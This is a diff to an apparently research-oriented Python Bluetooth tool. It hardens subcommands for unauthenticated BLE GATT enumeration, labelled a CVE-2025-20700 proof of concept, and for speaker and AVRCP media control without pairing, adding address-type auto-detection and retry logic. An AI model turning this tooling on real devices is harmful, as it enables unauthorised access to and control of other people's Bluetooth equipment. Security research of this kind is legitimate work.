@@ -657,7 +657,7 @@ def parse_args():
     # Scan subcommand - discover Bluetooth devices
     scan_parser = subparsers.add_parser(
         "scan",
-        help="Scan for Bluetooth devices (Classic and/or BLE)"
+        help="Discover Bluetooth devices (active scan with device info)"
     )
     scan_parser.add_argument(
         "--mode",
@@ -680,7 +680,7 @@ def parse_args():
     # Sniff subcommand - passive BLE listening
     sniff_parser = subparsers.add_parser(
         "sniff",
-        help="Passive BLE advertisement sniffing (like nRF Connect)"
+        help="Passive BLE monitoring - continuous advertisement capture (research tool)"
     )
     sniff_parser.add_argument(
         "--timeout",
@@ -717,7 +717,7 @@ def parse_args():
     # BLE Info subcommand - enumerate BLE device information
     ble_info_parser = subparsers.add_parser(
         "ble-info",
-        help="Enumerate BLE device information (connect and read GATT services)"
+        help="Enumerate BLE GATT services without auth (CVE-2025-20700 PoC)"
     )
     ble_info_parser.add_argument(
         "--timeout",
@@ -726,10 +726,10 @@ def parse_args():
         help="Connection timeout in seconds (default: 30)"
     )
 
-    # BLE Speaker Control PoC
+    # BLE Speaker Control PoC (Experimental)
     ble_speaker_parser = subparsers.add_parser(
         "ble-speaker",
-        help="Bluetooth speaker control PoC - probe and control audio devices via BLE"
+        help="[EXPERIMENTAL] BLE speaker control PoC - vendor-specific characteristics (limited success)"
     )
     ble_speaker_parser.add_argument(
         "--action",
@@ -755,10 +755,10 @@ def parse_args():
         help="Connection timeout in seconds (default: 30)"
     )
 
-    # AVRCP Classic Bluetooth Media Control
+    # AVRCP Classic Bluetooth Media Control (Experimental)
     avrcp_parser = subparsers.add_parser(
         "avrcp",
-        help="AVRCP media control via Classic Bluetooth - play, pause, volume control without pairing"
+        help="[EXPERIMENTAL] AVRCP media control via Classic Bluetooth - may fail if device connected elsewhere"
     )
     avrcp_parser.add_argument(
         "--action",
@@ -2609,6 +2609,7 @@ async def command_ble_info(args: argparse.Namespace):
     - Manufacturer, Model, Serial, Firmware (Device Information Service)
     - All available GATT services and characteristics
     """
+    import bumble.hci
     from bumble.device import Device, DeviceConfiguration, Peer
     from bumble.transport import open_transport_or_link
     from bumble.hci import Address
@@ -2856,76 +2857,117 @@ async def command_ble_info(args: argparse.Namespace):
         device = Device.from_config_with_hci(config, t.source, t.sink)
         await device.power_on()
 
-        target = Address(target_address)
+        # Parse address - check for explicit type suffix
+        addr_str = target_address.replace("/P", "").replace("/R", "")
+        if "/P" in target_address:
+            # Explicit public address
+            address_types = [(Address.PUBLIC_DEVICE_ADDRESS, "public")]
+        elif "/R" in target_address:
+            # Explicit random address
+            address_types = [(Address.RANDOM_DEVICE_ADDRESS, "random")]
+        else:
+            # Auto-detect: try public first (most common for commercial devices), then random
+            address_types = [
+                (Address.PUBLIC_DEVICE_ADDRESS, "public"),
+                (Address.RANDOM_DEVICE_ADDRESS, "random")
+            ]
 
-        # Retry loop for connection and discovery
-        for attempt in range(1, max_retries + 1):
-            # Connect to target
-            if attempt > 1:
-                print(f"\n  \033[1;33mRetry {attempt}/{max_retries}...\033[0m")
-                await asyncio.sleep(1.0)  # Brief pause before retry
+        # Try each address type
+        for addr_type, addr_type_name in address_types:
+            target = Address(addr_str, addr_type)
+            connection = None
 
-            print(f"  \033[1;33mConnecting to {target_address}...\033[0m")
+            if len(address_types) > 1:
+                print(f"  \033[1;33mTrying {addr_type_name} address...\033[0m")
 
-            try:
-                connection = await asyncio.wait_for(
-                    device.connect(target),
-                    timeout=timeout
-                )
-            except asyncio.TimeoutError:
+            # Retry loop for connection and discovery
+            for attempt in range(1, max_retries + 1):
+                # Connect to target
+                if attempt > 1:
+                    print(
+                        f"\n  \033[1;33mRetry {attempt}/{max_retries}...\033[0m")
+                    # Cancel any pending connection and reset controller state
+                    try:
+                        await device.host.send_command(
+                            bumble.hci.HCI_LE_Create_Connection_Cancel_Command()
+                        )
+                    except Exception:
+                        pass
+                    await asyncio.sleep(2.0)  # Give controller time to reset
+
                 print(
-                    f"  \033[1;31mConnection timed out after {timeout}s\033[0m")
-                if attempt == max_retries:
-                    return
-                continue
-            except Exception as e:
-                print(f"  \033[1;31mConnection failed: {e}\033[0m")
-                if attempt == max_retries:
-                    return
-                continue
+                    f"  \033[1;33mConnecting to {addr_str} ({addr_type_name})...\033[0m")
 
-            print(f"  \033[1;32mConnected!\033[0m")
-            print(f"  Connection Handle: 0x{connection.handle:04X}")
-
-            # Create peer for GATT operations
-            peer = Peer(connection)
-
-            print(f"\n  \033[1;33mDiscovering GATT services...\033[0m")
-            try:
-                await asyncio.wait_for(peer.discover_services(), timeout=15.0)
-                await asyncio.wait_for(peer.discover_characteristics(), timeout=15.0)
-                # Success - break out of retry loop
-                break
-            except asyncio.TimeoutError:
-                print(f"  \033[1;31mService discovery timed out\033[0m")
                 try:
-                    await connection.disconnect()
-                except Exception:
-                    pass
-                connection = None
-                peer = None
-                if attempt == max_retries:
-                    return
-                continue
-            except (asyncio.CancelledError, Exception) as e:
-                err_msg = "Connection lost" if isinstance(
-                    e, asyncio.CancelledError) else str(e)
-                print(
-                    f"  \033[1;31mService discovery failed: {err_msg}\033[0m")
+                    connection = await asyncio.wait_for(
+                        device.connect(target),
+                        timeout=timeout
+                    )
+                except asyncio.TimeoutError:
+                    print(
+                        f"  \033[1;31mConnection timed out after {timeout}s\033[0m")
+                    # Cancel the pending connection
+                    try:
+                        await device.host.send_command(
+                            bumble.hci.HCI_LE_Create_Connection_Cancel_Command()
+                        )
+                    except Exception:
+                        pass
+                    if attempt == max_retries:
+                        break  # Try next address type
+                    continue
+                except Exception as e:
+                    print(f"  \033[1;31mConnection failed: {e}\033[0m")
+                    if attempt == max_retries:
+                        break  # Try next address type
+                    continue
+
+                print(f"  \033[1;32mConnected!\033[0m")
+                print(f"  Connection Handle: 0x{connection.handle:04X}")
+
+                # Create peer for GATT operations
+                peer = Peer(connection)
+
+                print(f"\n  \033[1;33mDiscovering GATT services...\033[0m")
                 try:
-                    if connection:
+                    await asyncio.wait_for(peer.discover_services(), timeout=15.0)
+                    await asyncio.wait_for(peer.discover_characteristics(), timeout=15.0)
+                    # Success - break out of both loops
+                    break
+                except asyncio.TimeoutError:
+                    print(f"  \033[1;31mService discovery timed out\033[0m")
+                    try:
                         await connection.disconnect()
-                except Exception:
-                    pass
-                connection = None
-                peer = None
-                if attempt == max_retries:
-                    return
-                continue
+                    except Exception:
+                        pass
+                    connection = None
+                    peer = None
+                    if attempt == max_retries:
+                        break  # Try next address type
+                    continue
+                except (asyncio.CancelledError, Exception) as e:
+                    err_msg = "Connection lost" if isinstance(
+                        e, asyncio.CancelledError) else str(e)
+                    print(
+                        f"  \033[1;31mService discovery failed: {err_msg}\033[0m")
+                    try:
+                        if connection:
+                            await connection.disconnect()
+                    except Exception:
+                        pass
+                    connection = None
+                    peer = None
+                    if attempt == max_retries:
+                        break  # Try next address type
+                    continue
+
+            # If we connected successfully, break out of address type loop
+            if connection and peer:
+                break
 
         if not peer or not connection:
             print(
-                f"  \033[1;31mFailed to connect after {max_retries} attempts\033[0m")
+                f"  \033[1;31mFailed to connect with any address type\033[0m")
             return
 
         # Collect device info
@@ -3471,23 +3513,55 @@ async def command_ble_speaker(args: argparse.Namespace):
         device = Device.from_config_with_hci(device_config, t.source, t.sink)
         await device.power_on()
 
-        # Connect to device
-        print(f"  Connecting to {target_address}...")
-
-        # Handle public/random address
-        addr_str = target_address.replace("/P", "")
-        if target_address.endswith("/P"):
-            address = Address(addr_str, Address.PUBLIC_DEVICE_ADDRESS)
+        # Connect to device - auto-detect address type
+        # Parse address - check for explicit type suffix
+        addr_str = target_address.replace("/P", "").replace("/R", "")
+        if "/P" in target_address:
+            # Explicit public address
+            address_types = [(Address.PUBLIC_DEVICE_ADDRESS, "public")]
+        elif "/R" in target_address:
+            # Explicit random address
+            address_types = [(Address.RANDOM_DEVICE_ADDRESS, "random")]
         else:
-            address = Address(addr_str, Address.RANDOM_DEVICE_ADDRESS)
+            # Auto-detect: try public first (most common for commercial devices), then random
+            address_types = [
+                (Address.PUBLIC_DEVICE_ADDRESS, "public"),
+                (Address.RANDOM_DEVICE_ADDRESS, "random")
+            ]
 
-        connection = await asyncio.wait_for(
-            device.connect(address),
-            timeout=timeout
-        )
+        connection = None
+        for addr_type, addr_type_name in address_types:
+            address = Address(addr_str, addr_type)
 
-        print(
-            f"  \033[1;32mConnected!\033[0m Handle: 0x{connection.handle:04X}\n")
+            if len(address_types) > 1:
+                print(f"  Trying {addr_type_name} address...")
+
+            print(f"  Connecting to {addr_str} ({addr_type_name})...")
+
+            try:
+                connection = await asyncio.wait_for(
+                    device.connect(address),
+                    timeout=timeout
+                )
+                print(
+                    f"  \033[1;32mConnected!\033[0m Handle: 0x{connection.handle:04X}\n")
+                break  # Success!
+            except asyncio.TimeoutError:
+                print(
+                    f"  \033[1;31mConnection timed out after {timeout}s\033[0m")
+                if addr_type_name == address_types[-1][1]:
+                    raise  # Last attempt, propagate error
+                continue
+            except Exception as e:
+                print(f"  \033[1;31mConnection failed: {e}\033[0m")
+                if addr_type_name == address_types[-1][1]:
+                    raise  # Last attempt, propagate error
+                continue
+
+        if connection is None:
+            print(
+                f"  \033[1;31mFailed to connect with any address type\033[0m")
+            return
 
         # Discover services
         print(f"  Discovering GATT services...")
@@ -4002,18 +4076,70 @@ async def command_avrcp(args: argparse.Namespace):
                 return 0, []
 
         delegate = MinimalDelegate()
-        avrcp_protocol = avrcp.Protocol(delegate)
 
-        try:
-            await asyncio.wait_for(
-                avrcp_protocol.connect(connection),
-                timeout=10.0
-            )
+        # Try AVRCP connection with retries
+        avrcp_retries = 3
+        for avrcp_attempt in range(avrcp_retries):
+            try:
+                avrcp_protocol = avrcp.Protocol(delegate)
+                await asyncio.wait_for(
+                    avrcp_protocol.connect(connection),
+                    timeout=10.0
+                )
+                print(
+                    f"  \033[1;32m✓ AVRCP connected without authentication!\033[0m")
+                break
+            except asyncio.CancelledError:
+                print(
+                    f"\n  \033[0;33m⚠ AVRCP connection cancelled (attempt {avrcp_attempt + 1}/{avrcp_retries})\033[0m")
+                if avrcp_attempt < avrcp_retries - 1:
+                    print(f"    Connection may have dropped. Reconnecting...")
+                    # Reconnect the underlying BR/EDR connection
+                    try:
+                        await checker.close()
+                    except Exception:
+                        pass
+                    await asyncio.sleep(1.0)
+
+                    # Re-setup checker
+                    checker = RFCOMMBumbleChecker(
+                        controller, target_address, False)
+                    await checker.setup()
+
+                    try:
+                        checker.connection = await asyncio.wait_for(
+                            checker.device.connect(
+                                target_address, transport=BT_BR_EDR_TRANSPORT),
+                            timeout=timeout
+                        )
+                        connection = checker.connection
+                        print(f"    \033[1;32m✓ Reconnected!\033[0m")
+                    except Exception as reconn_err:
+                        print(
+                            f"    \033[0;31m✗ Reconnection failed: {reconn_err}\033[0m")
+                        continue
+                else:
+                    print(
+                        f"\n  \033[1;31m✗ AVRCP connection failed after {avrcp_retries} attempts.\033[0m")
+                    print(f"    The device may be rejecting the AVRCP connection.")
+                    print(
+                        f"    Try disconnecting the speaker from other devices first.")
+                    return
+            except Exception as e:
+                error_str = str(e).lower()
+                if "cancelled" in error_str:
+                    print(
+                        f"\n  \033[0;33m⚠ Connection lost during AVRCP setup (attempt {avrcp_attempt + 1}/{avrcp_retries})\033[0m")
+                    if avrcp_attempt < avrcp_retries - 1:
+                        await asyncio.sleep(1.0)
+                        continue
+                print(f"\n  \033[1;31m✗ AVRCP connection failed: {e}\033[0m")
+                print(f"  Device may require authentication for AVRCP.")
+                return
+
+        if avrcp_protocol is None:
             print(
-                f"  \033[1;32m✓ AVRCP connected without authentication!\033[0m")
-        except Exception as e:
-            print(f"\n  \033[1;31m✗ AVRCP connection failed: {e}\033[0m")
-            print(f"  Device may require authentication for AVRCP.")
+                f"\n  \033[1;31m✗ Failed to establish AVRCP connection.\033[0m")
             return
 
         await asyncio.sleep(0.3)
